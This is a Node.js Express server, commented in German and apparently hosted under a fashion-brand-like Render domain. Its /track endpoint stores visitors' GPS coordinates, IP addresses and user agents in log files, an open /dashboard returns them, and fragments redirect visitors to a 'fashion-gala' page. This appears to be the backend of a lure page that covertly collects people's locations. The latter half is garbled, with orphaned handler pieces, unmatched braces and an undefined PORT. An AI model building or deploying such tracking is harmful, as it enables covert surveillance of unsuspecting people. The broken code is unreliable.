// 🔥 1. HTTPS-Erzwingung (KRITISCH für Render)
const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const cors = require('cors');

// 📁 Log-Verzeichnis erstellen
const LOG_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

// 🛡️ 2. Middleware-Konfiguration
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// 🌐 3. CORS mit Whitelisting (Sicherheit!)
const allowedOrigins = [
  'https://loropiana1.onrender.com',
  'https://your-custom-domain.com' // Falls vorhanden
];

app.use(cors({
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.error('🚨 Blockierte CORS-Anfrage von:', origin);
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST'],
  credentials: true
}));

// 💀 4. Request-Logging Middleware (Debugging)
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  if (req.body && Object.keys(req.body).length > 0) {
    console.log('Request Body:', JSON.stringify(req.body));
  }
  next();
});

// 📌 5. Tracking-Endpoint (MIT VALIDIERUNG)
app.post('/track', (req, res) => {
  try {
    // 🎯 Datenvalidierung
    const { lat, lng, accuracy, method, ip } = req.body;
    if (!lat || !lng || !accuracy) {
      throw new Error('Ungültige Tracking-Daten');
    }

    // 📝 Log-Eintrag erstellen
    const logEntry = {
      timestamp: new Date().toISOString(),
      coordinates: { 
        lat: parseFloat(lat).toFixed(6),
        lng: parseFloat(lng).toFixed(6) 
      },
      accuracy: `${Math.floor(accuracy)}m`,
      method: method || 'UNKNOWN',
      ip: ip || req.ip,
      userAgent: req.get('User-Agent'),
      status: accuracy <= 2000 ? "✅ ERFOLG" : "⚠️ UNGENAU"
    };

    // 💾 Sync + Async Logging (Ausfallsicher)
    fs.appendFileSync(
      path.join(LOG_DIR, 'tracking.log'),
      JSON.stringify(logEntry) + '\n'
    );

    // 🔄 Backup-Log (für Render)
    if (process.env.RENDER) {
      fs.appendFile(
        path.join(LOG_DIR, 'backup.log'),
        JSON.stringify(logEntry) + '\n',
        (err) => { if (err) console.error('Backup-Log Fehler:', err); }
      );
    }

    res.sendStatus(200);
  } catch (error) {
    console.error('❌ Tracking-Fehler:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// 🗺️ 6. Dashboard-Endpoint (Optional)
app.get('/dashboard', (req, res) => {
  try {
    const logs = fs.readFileSync(path.join(LOG_DIR, 'tracking.log'), 'utf-8')
      .split('\n')
      .filter(Boolean)
      .map(JSON.parse);

    res.json({
      total: logs.length,
      accurate: logs.filter(log => log.status.includes('✅')).length,
      recent: logs.slice(-10).reverse()
    });
  } catch (error) {
    res.status(500).json({ error: 'Logs konnten nicht gelesen werden' });
  }
});

// ⚠️ 7. Error-Handler (GANZ WICHTIG)
app.use((err, req, res, next) => {
  console.error('💥 Server Error:', err.stack);
  res.status(500).send('Interner Serverfehler');
});

process.on('unhandledRejection', (err) => {
  console.error('🔥 Unhandled Rejection:', err);
});

  res.redirect('/fashion-gala.html');

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

    await fetch('https://loropiana1.onrender.com/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logData)
    });

    res.redirect('/fashion-gala.html');

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
